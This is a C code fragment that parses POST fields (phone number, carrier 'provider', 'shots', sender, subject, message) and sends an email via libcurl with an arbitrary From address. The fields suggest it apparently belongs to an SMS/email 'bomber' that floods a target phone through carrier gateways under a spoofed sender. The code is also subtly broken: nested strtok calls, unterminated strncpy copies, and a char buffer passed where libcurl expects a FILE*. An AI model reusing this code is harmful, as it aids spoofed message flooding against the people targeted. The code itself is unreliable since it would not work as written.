/* Function to parse POST data */
void parse_post_data(char *post_data, char *number, char *provider, char *shots, char *sender, char *subject, char *msg) {
    char *token = strtok(post_data, "&");
    while (token != NULL) {
        char *key = strtok(token, "=");
        char *value = strtok(NULL, "=");
        if (key && value) {
            if (strcmp(key, "number") == 0) strncpy(number, value, 255);
            else if (strcmp(key, "provider") == 0) strncpy(provider, value, 255);
            else if (strcmp(key, "shots") == 0) strncpy(shots, value, 255);
            else if (strcmp(key, "sender") == 0) strncpy(sender, value, 255);
            else if (strcmp(key, "subject") == 0) strncpy(subject, value, 255);
            else if (strcmp(key, "msg") == 0) strncpy(msg, value, 255);
        }
        token = strtok(NULL, "&");
    }
}

/* Function to send email using libcurl */
int send_email(const char *to, const char *from, const char *subject, const char *msg, const char *provider) {
    CURL *curl;
    CURLcode res = CURLE_OK;
    struct curl_slist *recipients = NULL;
    char reply_to[512];
    snprintf(reply_to, sizeof(reply_to), "nobody@%s", provider);

    curl = curl_easy_init();
    if (curl) {
        /* Set SMTP server (replace with your SMTP server details) */
        curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.example.com:587");
        curl_easy_setopt(curl, CURLOPT_USERNAME, "your_smtp_username");
        curl_easy_setopt(curl, CURLOPT_PASSWORD, "your_smtp_password");
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, from);
        recipients = curl_slist_append(recipients, to);
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
        curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);

        /* Set email headers and body */
        char email_data[1024];
        snprintf(email_data, sizeof(email_data),
                 "From: %s\r\nTo: %s\r\nReply-To: %s\r\nSubject: %s\r\n\r\n%s\r\n",
                 from, to, reply_to, subject, msg);
        curl_easy_setopt(curl, CURLOPT_READFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        curl_easy_setopt(curl, CURLOPT_READDATA, email_data);
        curl_easy_setopt(curl, CURLOPT_INFILESIZE, (long)strlen(email_data));

        /* Send the email */
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }

        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
    }
    return res == CURLE_OK ? 0 : 1;
}

